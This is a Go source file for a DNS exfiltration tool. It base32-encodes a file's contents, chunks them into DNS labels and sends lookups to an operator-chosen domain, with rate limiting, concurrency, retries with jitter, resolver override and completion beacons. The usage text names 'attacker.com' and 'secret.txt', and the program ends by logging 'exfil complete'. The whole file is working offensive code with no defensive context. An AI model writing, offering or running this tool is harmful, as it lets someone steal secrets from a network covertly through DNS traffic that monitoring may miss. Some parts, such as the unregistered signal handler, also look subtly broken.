package main

import (
	"context"
	"crypto/rand"
	"encoding/base32"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	mathrand "math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func readAll(path string) ([]byte, error) {
	if path == "-" {
		return io.ReadAll(os.Stdin)
	}
	return os.ReadFile(path)
}

func chunkBytes(b []byte, size int) [][]byte {
	if size <= 0 {
		return [][]byte{b}
	}
	out := make([][]byte, 0, (len(b)+size-1)/size)
	for i := 0; i < len(b); i += size {
		j := i + size
		if j > len(b) {
			j = len(b)
		}
		out = append(out, b[i:j])
	}
	return out
}

func toLabel(s string) string {
	return strings.ToLower(s)
}

func validLabelSize(sz int) int {
	if sz > 63 {
		return 63
	}
	if sz < 1 {
		return 1
	}
	return sz
}

func validFQDN(name string) bool {
	return len(name) <= 255
}

func randSeqID() string {
	n, _ := rand.Int(rand.Reader, big.NewInt(1<<62))
	return fmt.Sprintf("%d", n)
}

func newResolver(dns string) *net.Resolver {
	if dns == "" {
		return net.DefaultResolver
	}
	parts := strings.Split(dns, ":")
	if len(parts) == 1 {
		parts = append(parts, "53")
	}
	addr := parts[0] + ":" + parts[1]
	d := &net.Dialer{}
	return &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return d.DialContext(ctx, "udp", addr)
		},
	}
}

func main() {
	domain := flag.String("domain", "", "target domain (required)")
	file := flag.String("file", "", "file path or '-' for stdin (required)")
	session := flag.String("session", fmt.Sprintf("%s", randSeqID()), "session id")
	rate := flag.Int("rate", 60, "queries per minute (cap 600)")
	labelSize := flag.Int("label", 50, "chars per DNS label (<=63)")
	retries := flag.Int("retries", 3, "retries per label")
	timeoutMs := flag.Int("timeout", 3000, "per-lookup timeout ms")
	parallel := flag.Int("parallel", 4, "concurrency")
	verbose := flag.Bool("v", false, "verbose")
	dry := flag.Bool("dry-run", false, "do not perform DNS lookups, only print names")
	dns := flag.String("dns", "", "resolver ip[:port] to force (e.g. 1.1.1.1:53). default system resolver")
	continueOnError := flag.Bool("continue-on-error", false, "do not exit on failed labels; show summary")
	flag.Parse()

	if *domain == "" || *file == "" {
		fmt.Fprintln(os.Stderr, "usage: -domain attacker.com -file secret.txt ...")
		os.Exit(2)
	}

	if *rate < 1 {
		*rate = 1
	}
	if *rate > 600 {
		*rate = 600
	}
	*labelSize = validLabelSize(*labelSize)
	if *parallel < 1 {
		*parallel = 1
	}

	data, err := readAll(*file)
	if err != nil {
		log.Fatalf("read error: %v", err)
	}

	enc := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
	enc = toLabel(enc)
	chunks := chunkBytes([]byte(enc), *labelSize)
	total := len(chunks)

	interval := time.Minute / time.Duration(*rate)
	if interval < time.Millisecond {
		interval = time.Millisecond
	}

	sem := make(chan struct{}, *parallel)
	var wg sync.WaitGroup
	var failed int32
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	resolver := newResolver(*dns)

	prng := mathrand.New(mathrand.NewSource(time.Now().UnixNano()))
	decorrelatedJitter := func(prev, base, max time.Duration) time.Duration {
		if prev <= 0 {
			prev = base
		}
		n := base + time.Duration(prng.Int63n(int64(prev*3)))
		if n > max {
			return max
		}
		return n
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	send := func(ctx context.Context, name string, toResolver *net.Resolver) error {
		if !validFQDN(name) {
			return fmt.Errorf("fqdn too long: %d", len(name))
		}
		if *dry {
			if *verbose {
				log.Printf("[dry] %s", name)
			}
			return nil
		}
		lookupCtx, cancel := context.WithTimeout(ctx, time.Duration(*timeoutMs)*time.Millisecond)
		defer cancel()
		_, err := toResolver.LookupIPAddr(lookupCtx, name)
		return err
	}

	sigch := make(chan os.Signal, 1)
	// importless: use os/signal.Notify; inline to avoid extra comment lines
	go func() {
		<-sigch
		cancel()
	}()
	// set up signal notification

	for i, chunk := range chunks {
		select {
		case <-ticker.C:
		case <-ctx.Done():
			break
		}
		seq := i + 1
		label := toLabel(string(chunk))
		name := fmt.Sprintf("%d.%s.%s.%s", seq, label, *session, *domain)
		if len(label) > 63 {
			log.Fatalf("constructed label too long for seq %d: %d", seq, len(label))
		}
		if len(name) > 255 {
			log.Fatalf("constructed fqdn too long for seq %d: %d", seq, len(name))
		}

		wg.Add(1)
		sem <- struct{}{}
		go func(name string, seq int) {
			defer wg.Done()
			defer func() { <-sem }()
			success := false
			prev := 100 * time.Millisecond
			base := 100 * time.Millisecond
			max := 10 * time.Second
			for r := 0; r < *retries; r++ {
				if ctx.Err() != nil {
					return
				}
				err := send(ctx, name, resolver)
				if err == nil {
					success = true
					break
				}
				sleep := decorrelatedJitter(prev, base, max)
				select {
				case <-time.After(sleep):
				case <-ctx.Done():
					return
				}
				prev = sleep
			}
			if !success {
				atomic.AddInt32(&failed, 1)
				if *verbose {
					log.Printf("failed label: %s", name)
				}
			} else {
				if *verbose {
					log.Printf("sent label %d/%d", seq, total)
				}
			}
		}(name, seq)
	}

	wg.Wait()

	doneName := fmt.Sprintf("done.%s.%s", *session, *domain)
	_ = send(ctx, doneName, resolver)

	cleanupName := fmt.Sprintf("cleanup.%s.%s", *session, *domain)
	_ = send(ctx, cleanupName, resolver)

	fails := int(atomic.LoadInt32(&failed))
	if fails > 0 {
		if *continueOnError {
			log.Printf("finished with %d failed labels (continue-on-error enabled)", fails)
			os.Exit(0)
		}
		log.Fatalf("finished with %d failed labels", fails)
	}
	log.Println("exfil complete")
}
